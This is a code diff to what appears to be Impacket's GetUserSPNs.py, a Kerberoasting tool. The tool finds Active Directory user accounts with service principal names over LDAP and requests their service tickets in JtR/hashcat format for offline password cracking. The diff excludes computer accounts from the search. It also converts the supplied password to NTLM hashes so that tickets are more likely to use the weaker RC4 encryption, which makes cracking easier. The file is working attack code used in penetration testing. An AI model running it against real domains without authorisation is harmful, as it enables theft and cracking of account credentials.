@@ -24,7 +24,7 @@
 #
 # ToDo:
 #  [X] Add the capability for requesting TGS and output them in JtR/hashcat format
-#  [ ] Improve the search filter, we have to specify we don't want machine accounts in the answer
+#  [X] Improve the search filter, we have to specify we don't want machine accounts in the answer
 #      (play with userAccountControl)
 #
 
@@ -38,7 +38,7 @@ from binascii import hexlify, unhexlify
 
 from pyasn1.codec.der import decoder
 from impacket import version
-from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_NORMAL_ACCOUNT
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
 from impacket.examples import logger
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP
@@ -47,6 +47,7 @@ from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
 from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection
+from impacket.ntlm import compute_lmhash, compute_nthash
 
 
 class GetUserSPNs:
@@ -68,17 +69,15 @@ class GetUserSPNs:
             print outputFormat.format(*row)
 
     def __init__(self, username, password, domain, cmdLineOptions):
-        self.options = cmdLineOptions
         self.__username = username
         self.__password = password
         self.__domain = domain
         self.__lmhash = ''
         self.__nthash = ''
-        self.__outputFileName = options.outputfile
+        self.__outputFileName = cmdLineOptions.outputfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
-        self.__target = None
-        self.__requestTGS = options.request
+        self.__requestTGS = cmdLineOptions.request
         self.__kdcHost = cmdLineOptions.dc_ip
         self.__saveTGS = cmdLineOptions.save
         self.__requestUser = cmdLineOptions.request_user
@@ -101,9 +100,10 @@ class GetUserSPNs:
         try:
             s.login('', '')
         except Exception:
-            logging.debug('Error while anonymous logging into %s' % self.__domain)
-
-        s.logoff()
+            if s.getServerName() == '':
+                raise('Error while anonymous logging into %s' % self.__domain)
+        else:
+            s.logoff()
         return s.getServerName()
 
     @staticmethod
@@ -136,7 +136,26 @@ class GetUserSPNs:
 
         # No TGT in cache, request it
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+
+        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
+        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
+        # cleartext password.
+        # If no clear text password is provided, we just go with the defaults.
+        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
+            try:
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
+                                                                compute_lmhash(self.__password),
+                                                                compute_nthash(self.__password), self.__aesKey,
+                                                                kdcHost=self.__kdcHost)
+            except Exception, e:
+                logging.debug('TGT: %s' % str(e))
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+                                                                    unhexlify(self.__lmhash),
+                                                                    unhexlify(self.__nthash), self.__aesKey,
+                                                                    kdcHost=self.__kdcHost)
+
+        else:
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                 unhexlify(self.__lmhash),
                                                                 unhexlify(self.__nthash), self.__aesKey,
                                                                 kdcHost=self.__kdcHost)
@@ -214,16 +233,16 @@ class GetUserSPNs:
 
     def run(self):
         if self.__doKerberos:
-            self.__target = self.getMachineName()
+            target = self.getMachineName()
         else:
             if self.__kdcHost is not None:
-                self.__target = self.__kdcHost
+                target = self.__kdcHost
             else:
-                self.__target = self.__domain
+                target = self.__domain
 
         # Connect to LDAP
         try:
-            ldapConnection = ldap.LDAPConnection('ldap://%s'%self.__target, self.baseDN, self.__kdcHost)
+            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN, self.__kdcHost)
             if self.__doKerberos is not True:
                 ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             else:
@@ -232,7 +251,7 @@ class GetUserSPNs:
         except ldap.LDAPSessionError, e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
-                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
+                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
                 if self.__doKerberos is not True:
                     ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                 else:
@@ -243,7 +262,7 @@ class GetUserSPNs:
 
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
-                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))"
+                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"
 
         if self.__requestUser is not None:
             searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
@@ -281,10 +300,8 @@ class GetUserSPNs:
             try:
                 for attribute in item['attributes']:
                     if attribute['type'] == 'sAMAccountName':
-                        if str(attribute['vals'][0]).endswith('$') is False:
-                            # User Account
-                            sAMAccountName = str(attribute['vals'][0])
-                            mustCommit = True
+                        sAMAccountName = str(attribute['vals'][0])
+                        mustCommit = True
                     elif attribute['type'] == 'userAccountControl':
                         userAccountControl = str(attribute['vals'][0])
                     elif attribute['type'] == 'memberOf':
@@ -336,7 +353,7 @@ class GetUserSPNs:
                                                                                 TGT['sessionKey'])
                         self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN, fd)
                     except Exception , e:
-                        logging.error(str(e))
+                        logging.error('SPN: %s - %s' % (SPN,str(e)))
                 if fd is not None:
                     fd.close()
 
@@ -418,6 +435,7 @@ if __name__ == '__main__':
         executer = GetUserSPNs(username, password, domain, options)
         executer.run()
     except Exception, e:
-        #import traceback
-        #print traceback.print_exc()
-        print str(e)
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
+        logging.error(str(e))
